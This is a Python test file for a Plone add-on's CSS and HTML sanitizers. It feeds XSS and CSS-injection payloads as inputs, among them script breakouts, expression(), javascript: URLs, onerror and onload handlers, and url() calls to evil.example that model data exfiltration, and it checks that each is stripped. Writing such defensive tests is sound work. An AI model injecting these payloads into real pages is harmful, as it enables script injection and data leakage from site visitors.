"""Tests de los sanitizadores del Site Chrome (services/sanitizers.py).

No requieren Plone: sanitize_css es puro y sanitize_html cae al fallback
blocklist cuando portal_transforms no esta disponible (import lazy).
"""

from collective.sitechrome.services.sanitizers import sanitize_css, sanitize_html


# ─── sanitize_css: SC-4 (CSS injection) ──────────────────────────


def test_css_strips_style_breakout():
    out = sanitize_css('a{}</style><script>alert(1)</script>')
    assert '</style' not in out.lower()


def test_css_strips_expression():
    out = sanitize_css('x{width:expression(alert(1))}')
    assert 'expression(' not in out.lower()


def test_css_strips_at_import():
    out = sanitize_css('@import url(http://evil/x.css);')
    assert '@import' not in out.lower()


def test_css_strips_js_scheme():
    out = sanitize_css('a{background:url(javascript:alert(1))}')
    assert 'javascript:' not in out.lower()


def test_css_strips_behavior():
    out = sanitize_css('a{behavior:url(x.htc)}')
    assert 'behavior:' not in out.lower()


# ─── sanitize_css: SC-5 (url() externo / exfil) ──────────────────


def test_css_neutralizes_external_http_url():
    out = sanitize_css('a{background:url(https://evil.example/leak?c=1)}')
    assert 'evil.example' not in out
    assert 'about:blank' in out


def test_css_neutralizes_protocol_relative_url():
    out = sanitize_css('a{background:url(//evil.example/x.png)}')
    assert 'evil.example' not in out


def test_css_neutralizes_quoted_external_url():
    out = sanitize_css('a{background:url("https://evil.example/x.png")}')
    assert 'evil.example' not in out


def test_css_keeps_relative_url():
    out = sanitize_css('a{background:url(/static/logo.png)}')
    assert '/static/logo.png' in out


def test_css_external_url_allowed_when_opted_in():
    out = sanitize_css('a{background:url(https://cdn.example/f.woff)}',
                       allow_external_url=True)
    assert 'cdn.example' in out


def test_css_empty_passthrough():
    assert sanitize_css('') == ''
    assert sanitize_css(None) is None


# ─── sanitize_html: fallback blocklist (sin Plone) ───────────────


def test_html_strips_script():
    out = sanitize_html('<p>ok</p><script>alert(1)</script>')
    assert '<script' not in out.lower()


def test_html_strips_onerror_slash_separator():
    out = sanitize_html('<img/onerror="alert(1)" src=x>')
    assert 'onerror' not in out.lower()


def test_html_neutralizes_js_href():
    out = sanitize_html('<a href="javascript:alert(1)">x</a>')
    assert 'javascript:' not in out.lower()


def test_html_neutralizes_data_src():
    out = sanitize_html('<img src="data:text/html,<script>1</script>">')
    assert 'data:' not in out.lower()


def test_html_empty_passthrough():
    assert sanitize_html('') == ''
    assert sanitize_html(None) is None


# ─── sanitize_html: preservacion SC-1b (SVG limpio) / SC-1c (data:image) ──


def test_html_preserves_clean_svg_icon():
    svg = '<svg viewBox="0 0 24 24"><path d="M1 1h10"/></svg>'
    out = sanitize_html('<p>x</p>' + svg)
    assert svg in out  # se reinyecta TAL CUAL (viewBox preservado)


def test_html_drops_svg_with_script():
    out = sanitize_html('<svg><script>alert(1)</script><path d="M1 1"/></svg>')
    assert 'alert(1)' not in out
    assert '<script' not in out.lower()


def test_html_preserves_inert_raster_data_img():
    img = '<img src="data:image/png;base64,iVBORw0KGgo=" alt="logo">'
    out = sanitize_html('<footer>' + img + '</footer>')
    assert 'data:image/png;base64,iVBORw0KGgo=' in out


def test_html_drops_data_svg_xml_img():
    # data:image/svg+xml NO es raster inerte -> no se preserva, cae al allowlist
    out = sanitize_html('<img src="data:image/svg+xml,<svg onload=alert(1)>">')
    assert 'svg+xml' not in out.lower() or 'onload' not in out.lower()
